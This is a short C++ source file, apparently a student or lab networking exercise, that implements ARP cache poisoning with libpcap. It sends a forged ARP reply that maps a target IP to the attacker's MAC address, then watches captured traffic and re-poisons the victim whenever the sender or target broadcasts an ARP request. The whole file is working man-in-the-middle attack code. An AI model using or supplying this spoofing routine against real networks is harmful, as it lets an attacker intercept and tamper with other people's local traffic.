#include "arp-infect.h"

void ARPInfect(
    pcap_t* handle,
    Mac& attacker_mac,
    Ip& attacker_ip,
    Mac& sender_mac,
    Ip& sender_ip,
    Ip& target_ip)
{
    // sender ARP infect 
    sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);

    // check if broadcast packet come

    Mac arp_unknown = Mac("00:00:00:00:00:00");
    // 1. sender
    while (true)
    {
        struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
        EthArpPacket* captured_packet = (EthArpPacket*) packet;
        // find broadcast packet of gateway or sender, infect again
        if(captured_packet->eth_.type() == EthHdr::Arp && captured_packet->arp_.op() == ArpHdr::Request && captured_packet->arp_.sip() == sender_ip && captured_packet->arp_.tmac() == arp_unknown && captured_packet->arp_.tip() == target_ip){
            sleep(1000);
            sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
        }
        else if(captured_packet->eth_.type() == EthHdr::Arp && captured_packet->arp_.op() == ArpHdr::Request && captured_packet->arp_.sip() == target_ip && captured_packet->arp_.tmac() == arp_unknown && captured_packet->arp_.tip() == sender_ip){
            sleep(1000);
            sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
        }
    }
    
}